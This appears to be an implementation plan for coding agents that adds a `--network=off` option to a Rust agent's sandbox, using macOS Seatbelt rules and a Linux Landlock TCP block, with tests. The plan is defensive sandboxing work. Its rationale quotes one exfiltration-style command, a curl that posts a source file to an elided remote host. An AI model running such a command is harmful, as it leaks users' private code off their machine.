# `--network=off` — Implementation Plan

> **For agentic workers:** Implement exactly one task. Do NOT `git push`, open PRs, publish crates, start any paid run, or call any model API; commit locally only. Do not run Docker. This plan is shadow-run: agy and blyte each implement it independently.

**Goal:** `blyte --network=off` stops the commands blyte runs from connecting out, so workspace code
cannot leave the machine through them. blyte's own model calls are unaffected (they are made by the
blyte process, not by the sandboxed shell). Default stays `--network=on`.

**Why (2026-09-27):** the read-deny (#95) keeps secrets from being read, but a command could still
`curl -d @src/lib.rs https://…`. Some users run blyte on code that must not leave the machine.

**What each platform can do (checked by hand on macOS 2026-09-27; Linux from the Landlock docs):**
- macOS Seatbelt: `(deny network-outbound)` then `(allow network-outbound (remote ip "localhost:*"))`
  and `(allow network-outbound (remote unix-socket))` blocks TCP and UDP to any non-local host
  (curl, git over https, a raw UDP send all fail) while localhost servers and DNS (via the local
  mDNSResponder socket) still work. Allowing unix sockets also lets `docker` reach its daemon, which
  would run a networked container, so the Docker sockets are denied again after that rule
  (`(remote unix-socket (path-literal "…"))`; the last matching rule wins). `(remote ip "127.0.0.1:*")`
  is rejected by sandbox-exec (host must be `*` or `localhost`).
- Linux Landlock ABI ≥ 4: handling `AccessNet::ConnectTcp` with no port rules blocks **every** TCP
  `connect()`, localhost included. UDP and unix sockets (so Docker) are not covered. Below ABI 4 it
  cannot be enforced, so `--network=off` is refused there.

**Tech Stack:** Rust, SBPL, `landlock` 0.4.7 (already a Linux dependency).

## Global Constraints

- Work only in your own worktree (already on its own branch).
- Existing tests must pass **unmodified**. The `Profile::Seatbelt` and `Profile::Landlock` variants keep their shapes.
- `--network=on` (the default) must produce exactly the profile it produces today.
- Checks, all must pass:
  - `cargo fmt --all --check && cargo clippy --all-targets -- -D warnings && cargo test --workspace --all-targets`
  - Linux cross-check: `CC_aarch64_unknown_linux_gnu=zigcc-aarch64-linux cargo clippy --target aarch64-unknown-linux-gnu --workspace --all-targets -- -D warnings`
- Commit with `--no-gpg-sign` and the exact message below.

---

### Task 1: Offline profiles and the `--network` flag

**What to build** (names are part of the contract; the tests below check them):

`crates/blyte-agent/src/sandbox.rs`:
- New variant `Profile::LandlockOffline(Vec<PathBuf>)`: like `Landlock` (same write allow-list) and
  additionally blocks all TCP connects.
- `pub fn docker_sockets(home: &Path) -> Vec<PathBuf>`: `/var/run/docker.sock`, and under `home`:
  `.docker/run/docker.sock`, `.colima/default/docker.sock`, `.orbstack/run/docker.sock`, in that order.
- `pub fn offline(profile: String, docker_sockets: &[PathBuf]) -> String`: returns `profile` followed by
  `(deny network-outbound)(allow network-outbound (remote ip "localhost:*"))(allow network-outbound (remote unix-socket))`
  and then, if `docker_sockets` is non-empty, one
  `(deny network-outbound (remote unix-socket (path-literal "P")) …)` rule listing each socket path
  **and**, when it differs, its canonicalised path (on Docker Desktop `/var/run/docker.sock` is a
  symlink into the home directory). Escape paths as the rest of the module does.
- `pub fn default_profile_net(root: &Path, allow_read: &[PathBuf], network: bool) -> Profile`:
  `network == true` returns exactly `default_profile(root, allow_read)`. `network == false`: on macOS
  `Profile::Seatbelt(offline(<the default_profile string>, &docker_sockets(home)))` (empty socket list if
  `$HOME` is unset or empty); on other OSes `Profile::LandlockOffline(default_allowed(root))`.
- Linux only: `pub fn landlock_abi() -> i64`: the raw `landlock_create_ruleset(NULL, 0, 1)` result
  (what `available()` already computes; make `available()` use it: `landlock_abi() >= 1`). On other
  OSes it returns 0.
- `landlock_pre_exec(cmd, allowed)` gains a third parameter `block_tcp: bool`. When true, the ruleset
  also handles `AccessNet::ConnectTcp` (with no port rules, so every TCP connect is denied), and it
  must fail (return an error, run nothing) if `landlock_abi() < 4`. When false, behaviour is exactly
  today's. Keep the no-allocation rule inside `pre_exec`.

`crates/blyte-agent/src/shell.rs`: `Profile::LandlockOffline(paths)` is launched exactly like
`Profile::Landlock(paths)` but calls `landlock_pre_exec(&mut cmd, paths, true)` (`Landlock` passes
`false`). On non-Linux it is the same `Unsupported` error as `Landlock`.

`crates/blyte-cli/src/cli.rs`: `--network` with `default_value = "on"`, `value_parser = ["on", "off"]`,
doc: "Let commands blyte runs connect out: 'on' or 'off' (default 'on'). 'off' needs the sandbox".
Carry it through `TaskConfig` as `network: String` (`"on"` wherever a `TaskConfig` is built by hand).

`crates/blyte-cli/src/task_runner.rs`:
- Build the profile with `default_profile_net(&config.root, &config.allow_read, config.network == "on")`.
- `--network=off` is **refused** (return an error before any model call, with a message naming the
  reason) when: `--sandbox=off`; the sandbox is unavailable; running with `--container` ("set the
  container's network instead"); or on Linux when `landlock_abi() < 4` ("needs Linux 6.7 or later").
  Never fall back to running with the network on.
- When the profile is `LandlockOffline`, print once to stderr:
  `blyte: on Linux --network=off blocks TCP connections only (localhost included); UDP and the Docker socket are not blocked`.

Update the module doc of `sandbox.rs` with a short paragraph on `--network=off` per platform.

- [ ] **Step 1: Write the failing tests.** Create `crates/blyte-agent/tests/test_network_off.rs`:

```rust
//! `--network=off` stops the commands blyte runs from connecting out: read-deny kept secrets in, but
//! a command could still send workspace code anywhere (2026-09-27).

use std::path::{Path, PathBuf};

use blyte_agent::sandbox::{default_profile, default_profile_net, docker_sockets, offline, Profile};

#[test]
fn network_on_is_exactly_todays_profile() {
    let d = tempfile::tempdir().unwrap();
    assert_eq!(default_profile_net(d.path(), &[], true), default_profile(d.path(), &[]));
}

#[test]
fn the_offline_rules_allow_localhost_and_sockets_then_deny_docker_last() {
    let p = offline(
        "(version 1)".into(),
        &[PathBuf::from("/nonexistent/docker.sock")],
    );
    assert!(p.starts_with("(version 1)"), "{p}");
    let deny = p.find("(deny network-outbound)").expect(&p);
    let local = p.find(r#"(allow network-outbound (remote ip "localhost:*"))"#).expect(&p);
    let unix = p.find("(allow network-outbound (remote unix-socket))").expect(&p);
    let docker = p
        .find(r#"(deny network-outbound (remote unix-socket (path-literal "/nonexistent/docker.sock"))"#)
        .expect(&p);
    assert!(deny < local && local < unix && unix < docker, "{p}");
}

#[test]
fn the_docker_socket_list_covers_the_usual_runtimes() {
    let s = docker_sockets(Path::new("/Users/x"));
    assert_eq!(s[0], PathBuf::from("/var/run/docker.sock"));
    assert!(s.contains(&PathBuf::from("/Users/x/.docker/run/docker.sock")), "{s:?}");
    assert!(s.contains(&PathBuf::from("/Users/x/.orbstack/run/docker.sock")), "{s:?}");
}

#[test]
fn the_offline_default_profile_matches_the_platform() {
    let d = tempfile::tempdir().unwrap();
    match default_profile_net(d.path(), &[], false) {
        Profile::Seatbelt(s) => {
            assert!(cfg!(target_os = "macos"));
            assert!(s.contains("(deny network-outbound)"), "{s}");
        }
        Profile::LandlockOffline(paths) => {
            assert!(!cfg!(target_os = "macos"));
            assert!(paths.contains(&d.path().to_path_buf()), "{paths:?}");
        }
        other => panic!("unexpected {other:?}"),
    }
}

#[cfg(target_os = "macos")]
mod macos {
    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::time::Duration;

    use blyte_agent::sandbox::{offline, profile};
    use blyte_agent::shell::{LocalShell, Shell};

    #[test]
    fn offline_commands_reach_localhost_but_not_the_outside() {
        let ws = tempfile::tempdir().unwrap();
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        std::thread::spawn(move || {
            if let Ok((mut s, _)) = listener.accept() {
                let mut buf = [0u8; 1024];
                let _ = s.read(&mut buf);
                let _ = s.write_all(b"HTTP/1.0 200 OK\r\nContent-Length: 2\r\n\r\nok");
            }
        });
        let sh = LocalShell::sandboxed(offline(profile(&[ws.path().to_path_buf()]), &[]));
        let local = sh
            .exec(
                &format!("curl -s -m 5 http://localhost:{port}/"),
                ws.path(),
                Duration::from_secs(30),
            )
            .unwrap();
        if local.exit_code == 71 && local.merged().contains("Operation not permitted") {
            return; // nested sandboxing is not permitted here
        }
        assert_eq!(local.exit_code, 0, "{}", local.merged());
        assert!(local.merged().contains("ok"), "{}", local.merged());
        // 192.0.2.1 is TEST-NET-1: never routed, so this never leaves the machine even unsandboxed.
        // The sandbox refuses the connect at once instead of timing out.
        let out = sh
            .exec("curl -s -m 5 http://192.0.2.1/ ; echo rc=$?", ws.path(), Duration::from_secs(30))
            .unwrap();
        assert!(!out.merged().contains("rc=0"), "{}", out.merged());
        assert!(out.merged().contains("rc=7"), "connect should be refused (curl 7): {}", out.merged());
    }
}
```

Add a CLI test (new `crates/blyte-cli/tests/test_network_cli.rs`): `--network` defaults to `"on"`,
`--network off` parses and `TaskConfig::from(&cli).network == "off"`, `--network maybe` is rejected;
and that running with `--network off --sandbox off` is refused before any model call. For the last,
use the same way other CLI tests run a task without a real model (for example the scripted/fake
provider used in `test_task_runner.rs`); if no such path exists, test the refusal through whichever
function performs the check (make that function `pub` and name it `check_network_mode(config: &TaskConfig) -> Result<(), String>`).

- [ ] **Step 2: Run to confirm it fails.** `cargo test -p blyte-agent --test test_network_off`: compile error.

- [ ] **Step 3: Implement** the additions above.

- [ ] **Step 4: Verify.** Both checks from Global Constraints pass.

- [ ] **Step 5: Commit.**

```bash
git add -A crates
git commit --no-gpg-sign -m "feat(agent): --network=off stops the commands blyte runs from connecting out"
```
